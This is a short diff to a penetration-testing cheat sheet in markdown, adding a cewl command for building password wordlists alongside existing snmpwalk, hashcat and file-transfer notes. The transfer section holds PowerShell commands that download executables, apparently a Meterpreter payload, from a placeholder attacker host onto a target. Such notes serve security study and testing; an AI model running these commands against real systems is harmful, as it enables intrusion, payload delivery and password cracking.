@@ -66,6 +66,11 @@ snmpwalk -v2c -c <public> <IP.address> NET-SNMP-EXTEND-MIB::nsExtendObjects //ns
 #### Password Cracking
 `hashcat -a 0 -m #hash_type hash.txt dictionary_list.txt`<br>
 
+#### Generate password list from URL - cewl
+`cewl -d 3 -m 8 --with-numbers -w wordlist.out <http>` <br>
+
+
+
 #### Transfers
 `PS iwr -uri http://attacker.IP/met.exe -Outfile met.exe`<br>
 `powershell wget -Uri http://attacker_IP/name.exe -OutFile C:\destination\directory\name.exe`<br>
